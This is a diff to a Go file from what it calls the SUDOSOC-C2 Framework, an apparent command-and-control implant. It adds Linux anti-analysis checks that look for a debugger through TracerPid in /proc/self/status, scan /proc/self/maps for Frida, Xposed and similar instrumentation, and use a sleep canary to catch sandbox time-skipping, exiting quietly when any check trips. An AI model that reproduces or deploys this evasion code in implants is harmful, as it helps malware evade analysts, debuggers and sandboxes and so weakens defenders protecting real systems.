@@ -1,27 +1,79 @@
+//go:build linux
+
 package limits
 
 /*
-	SUDOSOC-C2 Framework
-	Copyright (C) 2019  Seif
+	SUDOSOC-C2 Framework — Linux Platform Limits
+	Copyright (C) 2026  sudosoc — Seif
 
-	This program is free software: you can redistribute it and/or modify
-	it under the terms of the GNU General Public License as published by
-	the Free Software Foundation, either version 3 of the License, or
-	(at your option) any later version.
-
-	This program is distributed in the hope that it will be useful,
-	but WITHOUT ANY WARRANTY; without even the implied warranty of
-	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-	GNU General Public License for more details.
-
-	You should have received a copy of the GNU General Public License
-	along with this program.  If not, see <https://www.gnu.org/licenses/>.
+	Authorized penetration testing use only.
 */
+
+import (
+	"bufio"
+	"os"
+	"strings"
+	"time"
+)
 
 func isDomainJoined() (bool, error) {
 	return false, nil
 }
 
+// PlatformLimits — Linux-specific anti-analysis checks.
+// Called by limits.go ExecLimits() when {{if not .Config.Debug}}.
 func PlatformLimits() {
+	// ── 1. Debugger / tracer via TracerPid ────────────────────────────────
+	if tracerPidDetected() {
+		time.Sleep(3 * time.Second)
+		os.Exit(0)
+	}
 
+	// ── 2. Frida / dynamic instrumentation in memory maps ────────────────
+	if instrumentationInMaps() {
+		time.Sleep(5 * time.Second)
+		os.Exit(0)
+	}
+
+	// ── 3. Sleep canary — detect sandbox time-skipping ───────────────────
+	start := time.Now()
+	time.Sleep(800 * time.Millisecond)
+	if time.Since(start) < 500*time.Millisecond {
+		os.Exit(0)
+	}
+}
+
+// tracerPidDetected reads /proc/self/status looking for a non-zero TracerPid.
+func tracerPidDetected() bool {
+	f, err := os.Open("/proc/self/status")
+	if err != nil {
+		return false
+	}
+	defer f.Close()
+	sc := bufio.NewScanner(f)
+	for sc.Scan() {
+		line := sc.Text()
+		if !strings.HasPrefix(line, "TracerPid:") {
+			continue
+		}
+		fields := strings.Fields(line)
+		return len(fields) >= 2 && fields[1] != "0"
+	}
+	return false
+}
+
+// instrumentationInMaps checks /proc/self/maps for Frida, Xposed, and
+// other runtime instrumentation frameworks.
+func instrumentationInMaps() bool {
+	data, err := os.ReadFile("/proc/self/maps")
+	if err != nil {
+		return false
+	}
+	low := strings.ToLower(string(data))
+	for _, sig := range []string{"frida", "xposed", "substrate", "lsposed", "gadget"} {
+		if strings.Contains(low, sig) {
+			return true
+		}
+	}
+	return false
 }
